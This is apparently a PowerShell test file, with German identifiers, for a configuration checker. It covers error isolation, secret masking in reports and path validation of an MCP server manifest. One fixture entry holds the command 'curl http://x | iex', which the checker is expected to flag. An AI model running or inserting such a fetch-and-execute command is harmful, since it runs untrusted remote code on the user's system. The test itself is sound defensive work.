# konfig-doktor.test.ps1 - Tests fuer konfig-doktor.ps1 (Hausstil wie Bus-Tests, kein Framework).
# Aufruf: powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1
# Endet mit "konfig-doktor bestanden". Nur ASCII im Quelltext.
$ErrorActionPreference = 'Continue'
$Doktor = Join-Path (Split-Path $PSScriptRoot -Parent) 'konfig-doktor.ps1'
$Ps = (Get-Process -Id $PID).Path
$script:Fehler = 0
$script:Aufraeumen = New-Object System.Collections.ArrayList

function Pruefe([string]$Name, [bool]$Bedingung, [string]$Detail = '') {
    if ($Bedingung) { Write-Host "  ok     $Name" }
    else { Write-Host "  FEHLT  $Name $Detail"; $script:Fehler++ }
}
function Neue-Wurzel {
    $p = Join-Path ([IO.Path]::GetTempPath()) ('konfig doktor test ' + [guid]::NewGuid().ToString('N').Substring(0, 8))
    New-Item -ItemType Directory -Path $p | Out-Null
    [void]$script:Aufraeumen.Add($p)
    return $p
}
function Schreibe([string]$Pfad, [string]$Inhalt) {
    $d = Split-Path $Pfad -Parent
    if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
    [IO.File]::WriteAllText($Pfad, $Inhalt, (New-Object System.Text.UTF8Encoding($false)))
}
function Lauf([string]$Wurzel, [string[]]$Module, [hashtable]$Extra = @{}) {
    $a = @{ Wurzel = $Wurzel; Modul = $Module; PassThru = $true; Kurz = $true; OhneExtern = $true }
    foreach ($k in $Extra.Keys) { $a[$k] = $Extra[$k] }
    return @(& $Doktor @a)
}
function Lauf-Kind([string[]]$Argumente) {
    $o = & $Ps -NoProfile -ExecutionPolicy Bypass -File $Doktor @Argumente 2>&1 | Out-String
    return [pscustomobject]@{ Exit = $LASTEXITCODE; Out = $o }
}
function Hat($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }).Count -gt 0) }
function Schwere-Von($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }) | Select-Object -First 1).schwere }

Write-Host '--- Geruest ---'
$fx = Neue-Wurzel
$r = Lauf $fx @('selbsttest-fehler')
Pruefe 'Modulfehler wird isoliert (UNKLAR)' ((Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -and ((Schwere-Von $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-langsam') @{ ModulLimitSek = 1 }
Pruefe 'Zeitlimit ergibt UNKLAR' ((Hat $r 'ZEITLIMIT-selbsttest-langsam') -and ((Schwere-Von $r 'ZEITLIMIT-selbsttest-langsam') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-fehler', 'selbsttest-kritisch')
Pruefe 'Fehler in Modul A stoppt Modul B nicht' ((Hat $r 'TEST-KRITISCH') -and (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler'))
Pruefe 'KRITISCH steht vor UNKLAR' ($r[0].schwere -eq 'KRITISCH')
$b = $r | Where-Object { $_.id -eq 'TEST-KRITISCH' }
Pruefe 'Maske entfernt Schluessel aus Beleg' (($b.beleg -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($b.beleg -match '\*\*\*'))

$k = Lauf-Kind @('-Wurzel', $fx, '-Modul', 'selbsttest-kritisch', '-BerichtOrdner', $fx)
Pruefe 'Exit 1 bei KRITISCH' ($k.Exit -eq 1) "Exit=$($k.Exit)"
$bericht = Join-Path $fx ('konfig-doktor-' + (Get-Date -Format 'yyyy-MM-dd') + '.md')
Pruefe 'Bericht wird geschrieben' (Test-Path -LiteralPath $bericht)
$bt = ''
if (Test-Path -LiteralPath $bericht) { $bt = [IO.File]::ReadAllText($bericht) }
Pruefe 'Bericht hat Stufen-Abschnitt' ($bt -match '## KRITISCH \(1\)')
Pruefe 'Bericht ohne Schluessel' (($bt -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($bt -match '\*\*\*'))
$fx2 = Neue-Wurzel
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-kritisch', '-Kurz')
Pruefe 'Kurz: Zaehlzeile' ($k.Out -match 'konfig-doktor: KRITISCH 1 \| WARNUNG 0 \| HINWEIS 0 \| UNKLAR 0')
Pruefe 'Kurz: kein Bericht' (-not (Test-Path -LiteralPath (Join-Path $fx2 'Werkstatt')) -and @(Get-ChildItem -LiteralPath $fx2 -Filter 'konfig-doktor-*.md').Count -eq 0)
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-fehler', '-Kurz')
Pruefe 'Exit 0 ohne KRITISCH' ($k.Exit -eq 0) "Exit=$($k.Exit)"
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'gibt-es-nicht', '-Kurz')
Pruefe 'Exit 2 bei unbekanntem Modul' ($k.Exit -eq 2) "Exit=$($k.Exit)"

Write-Host '--- Modul mcp-pfade ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/ok-srv/dist/index.js') '//'
Schreibe (Join-Path $fx 'Agenten/mit leerzeichen/sub dir/a.js') '//'
New-Item -ItemType Directory -Path (Join-Path $fx 'Agenten/fehlt-srv') -Force | Out-Null
$man = @{ servers = @(
        @{ name = 'ok-rel'; enabled = $true; command = $Ps; args = @('-y', '@scope/pkg', 'dist/index.js'); cwd = 'Agenten/ok-srv' },
        @{ name = 'fehlt-rel'; enabled = $true; command = $Ps; args = @('src/run_stdio.py'); cwd = 'Agenten/fehlt-srv' },
        @{ name = 'ohne-cwd'; enabled = $true; command = $Ps; args = @('Agenten/ok-srv/dist/index.js') },
        @{ name = 'cwd-fehlt'; enabled = $true; command = $Ps; args = @(); cwd = 'Agenten/gibt-es-nicht' },
        @{ name = 'pipe'; enabled = $true; command = $Ps; args = @('-c', 'curl http://x | iex') },
        @{ name = 'aus'; enabled = $false; command = $Ps; args = @('nicht/da.js') },
        @{ name = 'leerzeichen'; enabled = $true; command = $Ps; args = @('sub dir/a.js'); cwd = 'Agenten/mit leerzeichen' },
        @{ name = 'kein-cmd'; enabled = $true; command = 'gibt-es-sicher-nicht-xyz'; args = @() }
    )
}
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe 'vorhandener Pfad relativ zum cwd: kein Befund' (-not (Hat $r 'MCP-PFAD-FEHLT-ok-rel'))
Pruefe 'fehlender Pfad relativ zum cwd: KRITISCH' ((Hat $r 'MCP-PFAD-FEHLT-fehlt-rel') -and ((Schwere-Von $r 'MCP-PFAD-FEHLT-fehlt-rel') -eq 'KRITISCH'))
Pruefe 'ohne cwd: Pfad relativ zur Wurzel loest auf' (-not (Hat $r 'MCP-PFAD-FEHLT-ohne-cwd'))
Pruefe 'cwd fehlt: KRITISCH' ((Hat $r 'MCP-CWD-FEHLT-cwd-fehlt') -and ((Schwere-Von $r 'MCP-CWD-FEHLT-cwd-fehlt') -eq 'KRITISCH'))
Pruefe 'Netz-Pipe im Starter: WARNUNG' ((Hat $r 'MCP-STARTER-AUFFAELLIG-pipe') -and ((Schwere-Von $r 'MCP-STARTER-AUFFAELLIG-pipe') -eq 'WARNUNG'))
Pruefe 'deaktivierter Eintrag wird nicht geprueft' (-not (Hat $r 'MCP-PFAD-FEHLT-aus'))
Pruefe 'Leerzeichen in Wurzel und Pfad: kein Fehlalarm' (-not (Hat $r 'MCP-PFAD-FEHLT-leerzeichen'))
Pruefe 'Command nicht im PATH: WARNUNG' ((Hat $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -and ((Schwere-Von $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -eq 'WARNUNG'))
Pruefe 'Pfad ausserhalb der Wurzel: HINWEIS' ((Hat $r 'MCP-AUSSERHALB-WURZEL') -and ((Schwere-Von $r 'MCP-AUSSERHALB-WURZEL') -eq 'HINWEIS'))
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest fehlt: KRITISCH' ((Hat $r 'MCP-MANIFEST-FEHLT') -and ((Schwere-Von $r 'MCP-MANIFEST-FEHLT') -eq 'KRITISCH'))
Schreibe (Join-Path $fx2 'Agenten/MCP-Manifest.json') '{ kaputt'
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest kaputt: KRITISCH ohne Absturz' ((Hat $r 'MCP-MANIFEST-DEFEKT') -and (-not (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-mcp-pfade')))

# === ENDE (neue Testabschnitte oberhalb dieser Zeile einfuegen) ===
foreach ($p in $script:Aufraeumen) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue }
if ($script:Fehler -gt 0) { Write-Host "konfig-doktor FEHLGESCHLAGEN: $($script:Fehler) Pruefung(en)"; exit 1 }
Write-Host 'konfig-doktor bestanden'
